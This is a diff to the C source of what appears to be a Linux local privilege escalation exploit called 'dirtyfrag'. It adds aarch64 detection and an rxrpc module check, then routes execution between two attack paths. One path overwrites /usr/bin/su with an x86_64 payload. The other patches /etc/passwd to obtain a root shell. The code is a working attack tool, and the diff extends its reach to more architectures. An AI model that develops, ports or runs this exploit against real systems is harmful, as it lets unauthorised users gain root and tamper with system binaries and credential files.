@@ -3,6 +3,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
+#include <sys/utsname.h>
 #include <unistd.h>
 #include <fcntl.h>
 #include <errno.h>
@@ -288,6 +289,8 @@ static int verify_byte(const char *path, off_t offset, uint8_t want)
 	return got == want ? 0 : -1;
 }
 
+static int runtime_is_aarch64(void);
+
 static int corrupt_su(void)
 {
 	setup_userns_netns();
@@ -324,6 +327,11 @@ static int corrupt_su(void)
 
 int su_lpe_main(int argc, char **argv)
 {
+	if (runtime_is_aarch64()) {
+		SLOG("skipping ESP /usr/bin/su overwrite on aarch64 (x86_64 payload only)");
+		errno = ENOTSUP;
+		return 1;
+	}
 	for (int i = 1; i < argc; i++) {
 		if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose"))
 			g_su_verbose = 1;
@@ -1695,6 +1703,8 @@ static const uint8_t su_marker[8] = {
 
 static int su_already_patched(void)
 {
+	if (runtime_is_aarch64())
+		return 0; /* x86_64 su marker is not valid on aarch64 */
 	int fd = open("/usr/bin/su", O_RDONLY);
 	if (fd < 0)
 		return 0;
@@ -1892,10 +1902,38 @@ static int run_root_pty(void)
 	return 0;
 }
 
+
+static int rxrpc_available(void)
+{
+	if (access("/sys/module/rxrpc", F_OK) == 0)
+		return 1;
+	FILE *f = fopen("/proc/modules", "r");
+	if (!f)
+		return 0;
+	char line[256];
+	while (fgets(line, sizeof(line), f)) {
+		if (!strncmp(line, "rxrpc ", 6)) {
+			fclose(f);
+			return 1;
+		}
+	}
+	fclose(f);
+	return 0;
+}
+
+static int runtime_is_aarch64(void)
+{
+	struct utsname u;
+	if (uname(&u) != 0)
+		return 0;
+	return strcmp(u.machine, "aarch64") == 0 || strcmp(u.machine, "arm64") == 0;
+}
+
 int main(int argc, char **argv)
 {
 	int verbose = (getenv("DIRTYFRAG_VERBOSE") != NULL);
 	int force_esp = 0, force_rxrpc = 0;
+	int is_aarch64 = runtime_is_aarch64();
 	int saved_err = -1;
 	int rc = 1;
 	int new_argc;
@@ -1926,13 +1964,29 @@ int main(int argc, char **argv)
 		for (int i = 0; !passwd_already_patched() && i < 3; i++)
 			rc = rxrpc_lpe_main(new_argc, co_argv);
 	} else if (force_esp) {
-		rc = su_lpe_main(new_argc, co_argv);
+		if (is_aarch64) {
+			dprintf(2, "dirtyfrag: --force-esp is unsupported on aarch64 (x86_64 payload only)\n");
+			rc = 1;
+		} else {
+			rc = su_lpe_main(new_argc, co_argv);
+		}
 	} else {
-		rc = su_lpe_main(new_argc, co_argv);
-		if (!su_already_patched()) {
-			rc = rxrpc_lpe_main(new_argc, co_argv);
-			for (int i = 0; !passwd_already_patched() && i < 3; i++)
+		if (is_aarch64) {
+			if (!rxrpc_available()) {
+				dprintf(2, "dirtyfrag: aarch64 mode requires loaded rxrpc module; ESP su overwrite is x86_64-only\n");
+				rc = 3;
+			} else {
 				rc = rxrpc_lpe_main(new_argc, co_argv);
+				for (int i = 0; !passwd_already_patched() && i < 3; i++)
+					rc = rxrpc_lpe_main(new_argc, co_argv);
+			}
+		} else {
+			rc = su_lpe_main(new_argc, co_argv);
+			if (!su_already_patched()) {
+				rc = rxrpc_lpe_main(new_argc, co_argv);
+				for (int i = 0; !passwd_already_patched() && i < 3; i++)
+					rc = rxrpc_lpe_main(new_argc, co_argv);
+			}
 		}
 	}
 
